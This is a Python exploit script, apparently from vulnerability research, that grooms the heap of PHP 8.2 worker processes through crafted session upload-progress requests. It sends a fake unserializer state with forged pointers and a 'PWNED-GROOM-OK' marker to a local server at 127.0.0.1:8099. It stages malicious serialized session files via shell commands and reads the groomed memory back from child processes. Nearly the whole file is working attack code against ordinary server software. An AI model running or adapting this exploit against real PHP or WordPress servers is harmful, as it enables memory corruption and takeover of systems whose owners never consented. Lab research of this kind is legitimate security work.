#!/usr/bin/env python3
"""a2_groom_roundtrip.py v2 - deterministic delivery + honest oracles.

v2 changes (source-verified against php-src-8.2 var_unserializer.re):
- R: does ZVAL_NEW_REF on the source entry and re-encodes as R:n again ->
  a successful round-trip can produce byte-identical session files, so
  the file oracle uses a junk trailer (rewrite removes it) and mtime.
- POISON ALL CHILDREN: ~8 producer fires round-robin across the pool ->
  every subsequent attempt delivers to a stale child (no more 1/6 lottery;
  the A1/A2 probes showed stale state persists across consumer requests,
  level only grows 1->2->3).
- definitive oracle: after each attempt, EVERY stale child's d chunk is
  read back - our groom layout (and the post-walk mutations: var_push at
  d+0x60, ZVAL_NEW_REF at d+0x100) is directly observable.

Fake-d layout (php 8.2.34 x86_64 pre-patch; entries@d+0x38 - the branch
HEAD's incomplete_classes_only field is the 618 FIX and absent here):
  last=d+0x38, first_dtor=0, last_dtor=0, allowed=0, ref_props=0,
  cur_depth=0, max_depth=0x1000, entries{used_slots=3,next=0,
  data[0..2]=d+0x100}, zval@0x100={d+0x120,0x106,0},
  zend_string@0x120={gc(5,6),h=0,len=14,"PWNED-GROOM-OK\\0"}
"""
import os
import re
import socket
import struct
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from a2_leak_collect import cexec, helper_scan, stage_session_file  # noqa
from a2_groom_probe import helper_read_at  # noqa

HOST, PORT = "127.0.0.1", 8099
B = b"WPFIRE"
MARK = b"PWNED-GROOM-OK"

def build_groom(d):
    g = bytearray(8193)
    q = lambda off, v: struct.pack_into("<Q", g, off, v)
    dw = lambda off, v: struct.pack_into("<I", g, off, v)
    q(0x00, d + 0x38)
    q(0x08, 0); q(0x10, 0); q(0x18, 0); q(0x20, 0); q(0x28, 0)
    q(0x30, 0x1000)          # max_depth (zend_long)
    q(0x38, 3)               # entries.used_slots = 3
    q(0x40, 0)               # entries.next
    q(0x48, d + 0x100)       # data[0]
    q(0x50, d + 0x100)       # data[1]  <- R:2 target
    q(0x58, d + 0x100)       # data[2]
    q(0x100, d + 0x120)      # zval.value
    dw(0x108, 0x106)         # IS_STRING|refcounted
    dw(0x10C, 0)
    dw(0x120, 5)             # string refcount
    dw(0x124, 6)             # gc type
    q(0x128, 0)              # h
    q(0x130, 14)             # len
    g[0x138:0x138+15] = MARK + b"\x00"
    return bytes(g)

def mp(sid, groom):
    body = (b"--" + B + b"\r\n"
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
            b"--" + B + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n'
            b"--" + B + b"\r\n"
            b'Content-Disposition: form-data; name="gr"\r\n'
            b"Content-Type: text/plain\r\n\r\n" + groom + b"\r\n"
            b"--" + B + b"\r\n"
            b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n"
            b"--" + B + b"--\r\n")
    head = (f"POST / HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + body

def fire(req, timeout=25):
    try:
        s = socket.create_connection((HOST, PORT), timeout=15)
        s.sendall(req)
        s.settimeout(timeout)
        buf = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
        s.close()
        return buf
    except ConnectionResetError:
        return b"<RESET>"

def stale_children():
    return [k for k in helper_scan() if k["level"] not in (0, None)]

def check_d_states():
    """Read d+0..0x150 of every stale child; return list of findings."""
    out = []
    for k in stale_children():
        data = helper_read_at(k["pid"], k["data"], 0x150)
        groomed = MARK in data
        last_q = struct.unpack_from("<Q", data, 0)[0] if len(data) >= 8 else 0
        out.append((k["pid"], k["data"], groomed,
                    data[:0x40].hex() if data else "?"))
    return out

def main():
    os.makedirs("results/wp-lastmile/a2", exist_ok=True)
    print("[*] poisoning ALL children (~8 producer fires, round-robin)")
    for i in range(8):
        sidA = "wp2gA" + uuid.uuid4().hex[:24]
        assert stage_session_file(sidA)
        fire(mp(sidA, b"pad"))
    st = stale_children()
    print(f"[+] {len(st)} stale children: "
          f"{[(k['pid'], hex(k['data'])) for k in st]}")
    if not st:
        print("[-] no stale children"); return 1
    d_values = {k["data"] for k in st}
    if len(d_values) > 1:
        print(f"[!] d varies across children: {[hex(v) for v in d_values]}"
              f" - groom uses the FIRST; d must be uniform (fork-inherited)")
    d = sorted(d_values)[0]
    groom = build_groom(d)

    for i in range(6):
        sidB = "wp2gB" + uuid.uuid4().hex[:24]
        # staged file: token + junk trailer (a rewrite REMOVES the trailer)
        cexec(f"printf 'k|a:1:{{i:0;R:2;}}ZZJUNKTRAILER' > /tmp/sess_{sidB}; "
              f"chown www-data:www-data /tmp/sess_{sidB}; chmod 600 /tmp/sess_{sidB}")
        resp = fire(mp(sidB, groom))
        m = re.search(rb"tried to allocate (\d+)",
                      resp.partition(b"\r\n\r\n")[2])
        warn = b"Session has been destroyed" in resp
        tag = (m.group(1).decode() if m else
               ("RESET" if resp == b"<RESET>" else
                ("EOF0" if len(resp) == 0 else f"resp{len(resp)}")))
        # file oracle
        rc, fcontent = cexec(f"cat /tmp/sess_{sidB} 2>/dev/null")
        trailer_gone = "ZZJUNKTRAILER" not in fcontent and len(fcontent) >= 0
        rewritten = fcontent != 'k|a:1:{i:0;R:2;}ZZJUNKTRAILER'
        # d readback across all stale children
        states = check_d_states()
        groomed = [s for s in states if s[2]]
        print(f"  [{i}] {tag}{' +destroyed-warn' if warn else ''} | "
              f"file={'REWRITTEN' if rewritten else 'untouched'} "
              f"'{fcontent[:40]}' | stale={len(states)} "
              f"groomed_d={len(groomed)}", flush=True)
        if groomed:
            pid, dd, _, head = groomed[0]
            print(f"[+] GROOM VERIFIED IN CHILD {pid} d=0x{dd:x}:")
            print(f"    d+0..0x40: {head}")
            open("results/wp-lastmile/a2/groom_landed.bin", "wb").write(
                helper_read_at(pid, dd, 8216))
            return 0
        time.sleep(0.5)
    print("[-] no groom verified; see states above for diagnosis")
    for s in check_d_states():
        print(f"    child {s[0]} d=0x{s[1]:x} groomed={s[2]} head={s[3]}")
    return 1

if __name__ == "__main__":
    sys.exit(main())
